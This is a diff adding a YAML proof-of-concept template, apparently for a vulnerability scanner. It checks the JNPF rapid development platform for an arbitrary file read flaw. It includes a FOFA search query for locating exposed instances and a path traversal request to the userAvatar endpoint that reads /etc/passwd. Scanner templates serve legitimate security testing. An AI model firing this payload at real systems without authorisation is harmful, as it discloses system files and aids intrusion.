@@ -1,0 +1,18 @@
+id: poc-yaml-jnpf-soft-useravatar-anyfile-read
+info:
+  name: JNPF快速开发平台 userAvatar 任意文件文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: JNPF快速开发平台
+  fofa: title="JNPF快速开发平台"
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(title,"JNPF快速开发平台")
+- method: GET
+  path: /api/file/Image/userAvatar/aa,..,..,..,..,..,..,..,..,..,etc,passwd
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<")
+variables: {}
+transport: http
